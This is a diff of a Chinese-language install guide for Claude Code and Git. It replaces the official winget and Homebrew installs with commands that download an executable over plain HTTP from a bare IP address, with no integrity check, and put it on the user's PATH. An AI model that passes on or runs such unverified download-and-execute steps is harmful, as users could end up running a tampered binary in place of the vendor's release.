@@ -2,20 +2,23 @@
 
 ## Windows
 
-### 安装 Claude Code 和 Git
+### 安装 Claude Code
 
 按 `Win` 键，输入 `powershell`，回车，执行：
 
 ```powershell
-winget install Anthropic.ClaudeCode
-winget install Git.Git
+New-Item -ItemType Directory -Force -Path $env:USERPROFILE\.local\bin
+Invoke-WebRequest -Uri "http://115.156.209.154:33000/Zxzz106/-/packages/generic/claude-code/2.1.169/files/1" -OutFile $env:USERPROFILE\.local\bin\claude.exe
+[Environment]::SetEnvironmentVariable("Path", "$env:USERPROFILE\.local\bin;" + [Environment]::GetEnvironmentVariable("Path", "User"), "User")
 ```
 
-> 如果网络不稳定，先为 winget 设置代理再执行安装：
-> ```powershell
-> winget settings --enable ProxyCommandLineOptions
-> set WINGET_PROXY_URL=http://127.0.0.1:7890
-> ```
+> 下载完成后需重新打开终端，使 PATH 生效。
+
+### 安装 Git
+
+```powershell
+winget install Git.Git
+```
 
 ### 推荐：安装常用软件
 
@@ -78,17 +81,18 @@ export HOMEBREW_API_DOMAIN="https://mirrors.ustc.edu.cn/homebrew-bottles/api"
 
 ### 安装 Claude Code
 
-这一步会从 Anthropic 下载软件包，可能需要开启代理：
 ```bash
-export HTTPS_PROXY=http://127.0.0.1:7890
+mkdir -p ~/.local/bin
+curl -L "http://115.156.209.154:33000/Zxzz106/-/packages/generic/claude-code/2.1.169/files/1" -o ~/.local/bin/claude
+chmod +x ~/.local/bin/claude
 ```
 
-然后安装的 Claude Code
-```bash
-brew install claude-code
-```
+确保 `~/.local/bin` 在 PATH 中：
 
-> 如果报错找不到 `brew` 命令，说明上一步的安装后配置没做或没生效，照 brew 安装完成后的屏幕提示操作即可。
+```bash
+echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.bashrc
+source ~/.bashrc
+```
 
 ### 推荐：安装常用软件
 
